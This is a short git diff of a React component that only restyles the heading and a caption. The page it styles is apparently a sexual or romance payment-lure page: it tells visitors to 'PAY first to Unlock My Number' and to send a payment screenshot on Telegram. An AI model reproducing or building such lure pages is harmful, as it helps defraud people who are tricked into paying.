@@ -74,11 +74,11 @@ function App() {
   return (
     <div className="App" onClick={() => { /*setisOpen(false) */ }}>
       <header className="App-header">
-        <h1 style={{ margin: '-20px 0px -10px 0px' }}>🍆Genuine Girl!!🍆</h1>
+        <h1 style={{ margin: '-20px 0px -10px 0px', color: "#82ffa5" }}>🍆Genuine Girl!!🍆</h1>
         <CopyExample />
         <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
         <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
-        <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
+        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
         {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
       </header>
     </div >
